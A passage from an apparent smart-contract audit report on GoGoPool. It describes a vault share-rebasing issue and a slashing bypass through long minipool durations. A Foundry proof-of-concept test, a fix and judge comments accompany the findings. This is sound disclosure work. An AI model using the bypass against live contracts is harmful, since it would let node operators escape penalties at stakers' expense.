+Best practice would add initial funds as part of the initialization of the contract (to prevent front-running).
+emersoncloud (GoGoPool) confirmed
+Alex the Entreprenerd (judge) commented:
+The Warden has shown how, by performing a small deposit, followed by a transfer, shares can be rebased, causing a grief in the best case, and complete fund loss in the worst case for every subsequent depositor.While the finding is fairly known, it’s impact should not be understated, and because of this I agree with High Severity.I recommend watching this presentation by Riley Holterhus which shows possible mitigations for the attack:https://youtu.be/_pO2jDgL0XE?t=601
+emersoncloud (GoGoPool) mitigated:
+Initialize ggAVAX with a deposit:multisig-labs/gogopool#49
+Status:Mitigation confirmed byRaymondFamandhansfriese.
+
+[H-06] MinipoolManager: node operator can avoid being slashed
+Submitted byHollaDieWaldfee, also found byenckrish,imare,bin2chen,danyams,0xdeadbeef0x,cozzetti, andladboy233
+When staking is done, a Rialto multisig callsMinipoolManager.recordStakingEnd(https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440).
+If theavaxTotalRewardAmthas the value zero, theMinipoolManagerwill slash the node operator’s GGP.
+The issue is that the amount to slash can be greater than the GGP balance the node operator has staked.
+This will cause the call toMinipoolManager.recordStakingEndto revert because an underflow is detected.
+This means a node operator can create a minipool that cannot be slashed.
+A node operator must provide at least 10% ofavaxAssignedas collateral by staking GGP.
+It is assumed that a node operator earns AVAX at a rate of 10% per year.
+So if a Minipool is created with a duration of> 365 days, the 10% collateral is not sufficient to pay the expected rewards.
+This causes the function call to revert.
+Another cause of the revert can be that the GGP price in AVAX changes. Specifically if the GGP price falls, there needs to be slashed more GGP.
+Therefore if the GGP price drops enough it can cause the call to slash to revert.
+I think it is important to say that with any collateralization ratio this can happen. The price of GGP must just drop enough or one must use a long enough duration.
+The exact impact of this also depends on how the Rialto multisig handles failed calls toMinipoolManager.recordStakingEnd.
+It looks like if this happens,MinipoolManager.recordStakingError(https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515) is called.
+This allows the node operator to withdraw his GGP stake.
+So in summary a node operator can create a Minipool that cannot be slashed and probably remove his GGP stake when it should have been slashed.
+Proof of Concept
+When callingMinipoolManager.recordStakingEnd(https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440) and theavaxTotalRewardAmtparameter is zero, the node operator is slashed:
+// No rewards means validation period failed, must slash node ops GGP.if(avaxTotalRewardAmt==0) {slash(minipoolIndex);}
+TheMinipoolManager.slashfunction (https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683) then calculatesexpectedAVAXRewardsAmtand from thisslashGGPAmt:
+uint256avaxLiquidStakerAmt=getUint(keccak256(abi.encodePacked("minipool.item",index,".avaxLiquidStakerAmt")));uint256expectedAVAXRewardsAmt=getExpectedAVAXRewardsAmt(duration,avaxLiquidStakerAmt);uint256slashGGPAmt=calculateGGPSlashAmt(expectedAVAXRewardsAmt);
+Downstream there is then a revert due to underflow because of the following line inStaking.decreaseGGPStake(https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97):
+subUint(keccak256(abi.encodePacked("staker.item",stakerIndex,".ggpStaked")),amount);
+You can add the following foundry test toMinipoolManager.t.sol:
+functiontestRecordStakingEndWithSlashFail()public{uint256duration=366days;uint256depositAmt=1000ether;uint256avaxAssignmentRequest=1000ether;uint256validationAmt=depositAmt+avaxAssignmentRequest;uint128ggpStakeAmt=100ether;vm.startPrank(nodeOp);ggp.approve(address(staking),MAX_AMT);staking.stakeGGP(ggpStakeAmt);MinipoolManager.Minipoolmemorymp1=createMinipool(depositAmt,avaxAssignmentRequest,duration);vm.stopPrank();addressliqStaker1=getActorWithTokens("liqStaker1",MAX_AMT,MAX_AMT);vm.prank(liqStaker1);ggAVAX.depositAVAX{value:MAX_AMT}();vm.prank(address(rialto));minipoolMgr.claimAndInitiateStaking(mp1.nodeID);bytes32txID=keccak256("txid");vm.prank(address(rialto));minipoolMgr.recordStakingStart(mp1.nodeID,txID,block.timestamp);vm.startPrank(address(rialto));skip(duration);minipoolMgr.recordStakingEnd{value:validationAmt}(mp1.nodeID,block.timestamp,0ether);}
+See that it runs successfully withduration = 365 daysand fails withduration = 366 days.
+The similar issue occurs when the GGP price drops. I chose to implement the test withdurationas the cause for the underflow because your tests use a fixed AVAX/GGP price.
+Tools Used
+VSCode, Foundry
+Recommended Mitigation Steps
+You should check if the amount to be slashed is greater than the node operator’s GGP balance. If this is the case, the amount to be slashed should be set to the node operator’s GGP balance.
+I believe this check can be implemented within theMinipoolManager.slashfunction without breaking any of the existing accounting logic.
+functionslash(int256index)private{addressnodeID=getAddress(keccak256(abi.encodePacked("minipool.item",index,".nodeID")));addressowner=getAddress(keccak256(abi.encodePacked("minipool.item",index,".owner")));uint256duration=getUint(keccak256(abi.encodePacked("minipool.item",index,".duration")));uint256avaxLiquidStakerAmt=getUint(keccak256(abi.encodePacked("minipool.item",index,".avaxLiquidStakerAmt")));uint256expectedAVAXRewardsAmt=getExpectedAVAXRewardsAmt(duration,avaxLiquidStakerAmt);uint256slashGGPAmt=calculateGGPSlashAmt(expectedAVAXRewardsAmt);setUint(keccak256(abi.encodePacked("minipool.item",index,".ggpSlashAmt")),slashGGPAmt);emitGGPSlashed(nodeID,slashGGPAmt);Stakingstaking=Staking(getContractAddress("Staking"));if(slashGGPAmt>staking.getGGPStake(owner)) {slashGGPAmt=staking.getGGPStake(owner);}staking.slashGGP(owner,slashGGPAmt);}
+emersoncloud (GoGoPool) confirmed, but commented:
+This is a combination of two other issues from other wardensSlash amount shouldn’t depend on duration:https://github.com/code-423n4/2022-12-gogopool-findings/issues/694GGP Slash shouldn’t revert:https://github.com/code-423n4/2022-12-gogopool-findings/issues/743
+Alex the Entreprenerd (judge) commented:
+This finding combines 2 issues:If price drops Slash can revert -> MediumAttacker can set Duration to too high to cause a revert -> HighAm going to dedupe this and the rest, but ultimately I think these are different findings, that should have been filed separately.
+Alex the Entreprenerd (judge) commented:
+The Warden has shown how a malicious staker could bypass slashing, by inputting a duration that is beyond the intended amount.Other reports have shown how to sidestep the slash or reduce it, however, this report shows how the bypass can be enacted maliciously to break the protocol functionality, to the attacker’s potential gain.Because slashing is sidestepped in it’s entirety, I believe this finding to be of High Severity.
+emersoncloud (GoGoPool) mitigated:
+If staked GGP doesn’t cover slash amount, slash it all:multisig-labs/gogopool#41
+Status:Original finding mitigated, but a medium severity economical risk is still present. Full details in reports fromRaymondFam,ladboy233andhansfriese. Also included in Mitigation Review section below.
+
